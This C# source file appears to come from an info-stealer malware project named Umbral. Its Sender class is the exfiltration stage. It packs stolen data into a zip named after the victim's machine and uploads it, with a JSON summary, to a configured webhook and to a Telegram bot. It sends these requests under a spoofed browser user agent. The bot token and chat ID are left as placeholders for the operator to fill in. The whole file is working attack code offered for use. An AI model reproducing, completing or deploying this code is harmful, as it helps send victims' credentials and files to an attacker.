using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace Umbral.payload.Postman
{
    internal static class Sender
    {
        private const string TelegramBotToken = "TOKEN -> @BotFather"; 
        private const string TelegramChatId = "CHATID -> @GetMyChatID_BestBot"; 

        internal static async Task Post(string zipPath, Dictionary<string, int> grabbedInfoDictionary)
        {
            TelegramPayloadGen payloadGen = new TelegramPayloadGen(grabbedInfoDictionary);
            string payload = await payloadGen.GetPayload();

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");

     
                    using (MultipartFormDataContent form = new MultipartFormDataContent())
                    {
                        byte[] fileBytes = File.ReadAllBytes(zipPath);
                        ByteArrayContent fileContent = new ByteArrayContent(fileBytes);
                        fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
                        form.Add(fileContent, "file", $"Umbral-{Environment.MachineName}.zip");

                        StringContent jsonContent = new StringContent(payload, Encoding.UTF8, "application/json");
                        await client.PostAsync(Settings.Webhook, jsonContent);
                        await client.PostAsync(Settings.Webhook, form);
                    }

                    string telegramMessageUrl = $"https://api.telegram.org/bot{TelegramBotToken}/sendMessage";
                    using (MultipartFormDataContent telegramForm = new MultipartFormDataContent())
                    {
                        StringContent messageContent = new StringContent(
                            $"{{\"chat_id\":\"{TelegramChatId}\",\"text\":{payload}}}",
                            Encoding.UTF8,
                            "application/json"
                        );
                        await client.PostAsync(telegramMessageUrl, messageContent);
                    }

                    string telegramFileUrl = $"https://api.telegram.org/bot{TelegramBotToken}/sendDocument";
                    using (MultipartFormDataContent telegramFileForm = new MultipartFormDataContent())
                    {
                        byte[] fileBytes = File.ReadAllBytes(zipPath);
                        ByteArrayContent fileContent = new ByteArrayContent(fileBytes);
                        fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
                        telegramFileForm.Add(fileContent, "document", $"Umbral-{Environment.MachineName}.zip");
                        telegramFileForm.Add(new StringContent(TelegramChatId), "chat_id");
                        await client.PostAsync(telegramFileUrl, telegramFileForm);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}